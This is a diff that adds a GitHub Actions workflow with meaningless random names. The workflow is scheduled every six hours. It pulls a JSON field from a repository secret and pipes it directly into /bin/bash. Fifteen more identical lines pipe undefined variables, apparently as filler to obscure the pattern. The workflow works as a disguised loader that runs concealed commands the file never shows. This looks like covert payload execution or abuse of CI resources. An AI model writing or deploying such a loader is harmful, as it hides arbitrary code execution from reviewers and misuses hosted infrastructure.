@@ -1,0 +1,34 @@
+name: dingdude8761
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dingdude8761
+        env:
+          twh27: ${{ secrets.twh27 }}
+        run: |
+          echo $twh27 | jq -r .az3380 | /bin/bash
+          echo $qwei69 | jq -r .eue4 | /bin/bash
+          echo $rc68023 | jq -r .wnazv679 | /bin/bash
+          echo $tbteb3348 | jq -r .akpa12 | /bin/bash
+          echo $ve96 | jq -r .cz073 | /bin/bash
+          echo $d1 | jq -r .gvmim63 | /bin/bash
+          echo $chgh204 | jq -r .hzi6 | /bin/bash
+          echo $xmru160 | jq -r .ywx67 | /bin/bash
+          echo $phxv56 | jq -r .khqig3434 | /bin/bash
+          echo $xkbvd82 | jq -r .sqn37 | /bin/bash
+          echo $k0091 | jq -r .epet2 | /bin/bash
+          echo $s4647 | jq -r .wdpj18 | /bin/bash
+          echo $vwev558 | jq -r .zgvjs69 | /bin/bash
+          echo $hiwgn0281 | jq -r .m203 | /bin/bash
+          echo $rzws7 | jq -r .vtz55 | /bin/bash
+          echo $sjp3 | jq -r .soa2260 | /bin/bash
+
